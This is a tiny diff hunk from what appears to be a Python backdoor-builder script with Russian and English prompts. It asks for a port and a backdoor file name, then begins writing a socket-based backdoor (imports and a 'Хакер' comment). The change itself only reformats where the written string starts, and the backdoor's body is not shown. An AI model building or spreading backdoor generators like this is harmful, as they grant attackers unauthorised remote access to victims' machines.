@@ -337,8 +337,7 @@ my_backdoor.run() """)
 			ptu = input('Введите порт')
 			e = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
 			b = open(e,"w",encoding='utf-8')
-			b.write("""
-			import socket, os, time, threading, sys
+			b.write("""import socket, os, time, threading, sys
 from queue import Queue
 # Хакер
 intThreads = 2
